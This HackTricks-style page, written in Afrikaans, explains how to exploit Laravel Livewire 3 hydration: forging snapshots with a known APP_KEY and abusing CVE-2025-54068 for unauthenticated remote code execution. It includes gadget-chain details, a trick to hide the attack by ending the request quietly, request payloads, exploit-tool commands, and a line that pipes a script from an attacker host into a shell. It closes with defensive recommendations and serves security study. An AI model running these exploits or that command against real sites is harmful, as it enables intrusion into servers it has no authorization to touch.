# Laravel Livewire Hydrering & Synthesizer-misbruik

{{#include ../../banners/hacktricks-training.md}}

## Opsomming van die Livewire-toestandmasjien

Livewire 3-komponente ruil hul toestand uit deur **snapshots** wat `data`, `memo`, en 'n checksum bevat. Elke POST na `/livewire/update` herhidreer die JSON snapshot server-side en voer die in die ry geplaatste `calls`/`updates` uit.
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
Enigiemand wat die `APP_KEY` in besit het (wat gebruik word om `$hashKey` af te lei) kan dus arbitrêre snapshots vervals deur die HMAC te herbereken.

Komplekse eienskappe word gekodeer as **sintetiese tuples** wat opgespoor word deur `Livewire\Drawer\BaseUtils::isSyntheticTuple()`; elke tuple is `[value, {"s":"<key>", ...meta}]`. Die hydration-kern delegeer eenvoudig elke tuple aan die synth wat in `HandleComponents::$propertySynthesizers` gekies is en rekursief oor kinders gaan:
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
Hierdie rekursiewe ontwerp maak Livewire 'n **generiese objek-instansiasie-enjin** sodra 'n aanvaller óf die tuple-metagegewens óf enige geneste tuple wat tydens rekursie verwerk word, beheer.

## Synthesizers that grant gadget primitives

| Synthesizer | Attacker-controlled behaviour |
|-------------|--------------------------------|
| **CollectionSynth (`clctn`)** | Instansieer `new $meta['class']($value)` nadat elke geneste item herhidreer is. Enige klas met 'n array-konstruktor kan geskep word, en elke item kan self 'n sintetiese tuple wees.
| **FormObjectSynth (`form`)** | Roep `new $meta['class']($component, $path)` op, en ken dan elke openbare eienskap toe vanaf deur die aanvaller beheerde children via `$hydrateChild`. Konstruktoren wat twee losweg getipeerde parameters (of verstek-argmente) aanvaar, is genoeg om by arbitrêre openbare eienskappe uit te kom.
| **ModelSynth (`mdl`)** | Wanneer `key` in meta afwesig is, voer dit `return new $class;` uit, wat nul-argument-instansiasie van enige klas onder die aanvaller se beheer moontlik maak.

Omdat synths `$hydrateChild` op elke geneste element aanroep, kan arbitrêre gadget-grafieke gebou word deur tuples rekursief op te stapel.

## Forging snapshots when `APP_KEY` is known

1. Vang 'n geldige `/livewire/update` request en decodeer `components[0].snapshot`.
2. Inject geneste tuples wat na gadget-klasse wys en herbereken `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)`.
3. Herkodeer die snapshot, laat `_token`/`memo` ongemoeid, en herstuur die request.

'n Minimale bewys van uitvoering gebruik **Guzzle's `FnStream`** en **Flysystem's `ShardedPrefixPublicUrlGenerator`**. Een tuple instansieer `FnStream` met konstruktor-data `{ "__toString": "phpinfo" }`, die volgende instansieer `ShardedPrefixPublicUrlGenerator` met `[FnStreamInstance]` as `$prefixes`. Wanneer Flysystem elke prefix na `string` kasteer, roep PHP die aanvaller-voorsiene `__toString` callable aan, wat enige funksie sonder argumente kan aanroep.

### From function calls to full RCE

Deur Livewire se instansiasie-primitiewe te benut, het Synacktiv phpggc se `Laravel/RCE4` ketting aangepas sodat hydration 'n object opstart waarvan die publieke Queueable-toestand deserialisering aktiveer:

1. **Queueable trait** – enige object wat `Illuminate\Bus\Queueable` gebruik, openbaar publieke `$chained` en voer `unserialize(array_shift($this->chained))` uit in `dispatchNextJobInChain()`.
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) word via `CollectionSynth` / `FormObjectSynth` geïnstantieer met die publieke `$chained` gevul.
3. **phpggc Laravel/RCE4Adapted** – die geserialiseerde blob wat in `$chained[0]` gestoor is, bou `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed`. `Signed::__invoke()` roep uiteindelik `call_user_func_array($closure, $args)` aan, wat `system($cmd)` moontlik maak.
4. **Stealth termination** – deur 'n tweede `FnStream` callable te voorsien, soos `[new Laravel\Prompts\Terminal(), 'exit']`, eindig die request met `exit()` in plaas van 'n luidrugtige uitsondering, wat die HTTP-response skoon hou.

### Automating snapshot forgery

`synacktiv/laravel-crypto-killer` lewer nou 'n `livewire` modus wat alles aanmekaar naai:
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
Die tool ontleed die vasgevangde snapshot, injekteer die gadget-tuples, herbereken die checksum, en druk 'n gereed-om-te-stuur `/livewire/update` payload uit.

## CVE-2025-54068 – RCE sonder `APP_KEY`

Volgens die kennisgewing van die verskaffer beïnvloed die kwessie Livewire v3 (>= 3.0.0-beta.1 en < 3.6.3) en is dit uniek aan v3.

`updates` word in die komponenttoestand samengevoeg **after** die snapshot checksum gevalideer is. As 'n eienskap binne die snapshot 'n synthetic tuple is (of so word), hergebruik Livewire die meta daarvan terwyl dit die attacker-controlled update value hydrateer:
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
Eksploit-resep:

1. Vind 'n Livewire-komponent met 'n ongetipeerde openbare eienskap (bv., `public $count;`).
2. Stuur 'n update wat daardie eienskap op `[]` stel. Die volgende snapshot stoor dit nou as `[[], {"s": "arr"}]`.

'n minimale type-juggling flow lyk soos volg:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Dan stoor die volgende snapshot 'n tuple wat die `arr` synthesizer metadata behou:

```json
"count": [[], {"s": "arr"}]
```

3. Konstrueer 'n ander `updates` payload waar daardie eienskap 'n diep-geneste array bevat wat tuples inbed soos `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]`.
4. Tydens rekursie evalueer `hydrate()` elke geneste kind onafhanklik, sodat deur die aanvaller gekose synth-sleutels/klasse gerespekteer word selfs al het die buitenste tuple en checksum nooit verander nie.
5. Hergebruik dieselfde `CollectionSynth`/`FormObjectSynth` primitives om 'n Queueable gadget te instansieer waarvan `$chained[0]` die phpggc payload bevat. Livewire verwerk die vervalste updates, roep `dispatchNextJobInChain()` aan, en bereik `system(<cmd>)` sonder om `APP_KEY` te ken.

Belangrike redes hoekom dit werk:

- `updates` word nie deur die snapshot checksum gedek nie.
- `getMetaForPath()` vertrou watter synth metadata reeds vir daardie eienskap bestaan het, selfs al het die aanvaller dit vroeër gedwing om 'n tuple te word via swak tipering.
- Rekursie plus swak tipering laat elke geneste array as 'n splinternuwe tuple geïnterpreteer word, sodat arbitrêre synth-sleutels en arbitrêre klasse uiteindelik by die hydration uitkom.

## Livepyre – end-tot-end uitbuiting

[Livepyre](https://github.com/synacktiv/Livepyre) outomatiseer beide die APP_KEY-loos CVE en die signed-snapshot-pad:

- Bepaal die gedeployde Livewire-weergawes deur `<script src="/livewire/livewire.js?id=HASH">` te ontleed en die hash aan kwesbare releases te koppel.
- Versamel basis-snapshots deur goedaardige aksies te herhaal en `components[].snapshot` te onttrek.
- Genereer óf 'n slegs-`updates` payload (CVE-2025-54068) óf 'n vervalste snapshot (met bekende `APP_KEY`) wat die phpggc-ketting insluit.
- As geen object-getipeerde parameter in 'n snapshot gevind word nie, val Livepyre terug op brute-forcing van kandidaat-parametrs om 'n eienskap te bereik wat tot 'n objek gedwing kan word.

Tipiese gebruik:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` voer 'n nie-destruktiewe probe uit, `-F` slaan version gating oor, `-H` en `-P` voeg pasgemaakte headers of proxies by, en `--function/--param` pas die php-funksie aan wat deur die gadget chain aangeroep word.

## Verdedigings-oorwegings

- Opgradeer na reggestelde Livewire-bou (>= 3.6.4 volgens die verskafferkennisgewing) en implementeer die verskaffer-patch vir CVE-2025-54068.
- Vermy swak getipede publieke eienskappe in Livewire-komponente; duidelike scalêre tipes voorkom dat eienskapswaardes in arrays/tuples gedwing word.
- Registreer slegs die synthesizers wat jy regtig nodig het en hanteer deur-gebruiker-beheerde metadata (`$meta['class']`) as onbetroubaar.
- Verwerp opdaterings wat die JSON-tipe van 'n eienskap verander (bv. scalar -> array) tensy uitdruklik toegelaat, en herlei synth-metadata in plaas daarvan om ou tuples te hergebruik.
- Rol `APP_KEY` onmiddellik na enige openbaarmaking aangesien dit offline snapshot forging moontlik maak ongeag hoe goed die kodebasis gepatch is.

## References

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
